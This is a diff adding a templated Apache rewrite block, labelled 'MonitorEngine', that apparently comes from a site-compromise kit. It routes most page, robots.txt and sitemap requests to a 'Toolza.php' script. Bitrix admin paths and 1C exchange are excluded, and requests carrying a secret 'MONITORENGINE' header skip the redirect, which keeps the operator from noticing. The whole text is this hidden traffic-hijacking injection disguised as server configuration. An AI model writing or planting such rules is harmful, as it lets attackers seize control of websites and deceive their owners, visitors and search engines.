@@ -1,0 +1,15 @@
+#MonitorEngineS_1010011010
+
+RewriteEngine On
+#cgi
+RewriteCond %{REQUEST_URI} .*/#{{pathToToolza}}#/Toolza.php$
+RewriteRule .* - [L]
+
+RewriteCond %{HTTP:MONITORENGINE} !^turns$
+RewriteCond %{REQUEST_URI} ^[^\.]*$ [OR]
+RewriteCond %{REQUEST_URI} ^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml)$
+RewriteCond %{REQUEST_URI} !^/bitrix/
+RewriteCond %{REQUEST_URI} !1c_exchange.php
+RewriteRule ^.*$ #{{pathToToolza}}#/Toolza.php [L]
+#MonitorEngineE_1010011010
+#{{lastHtaccess}}#
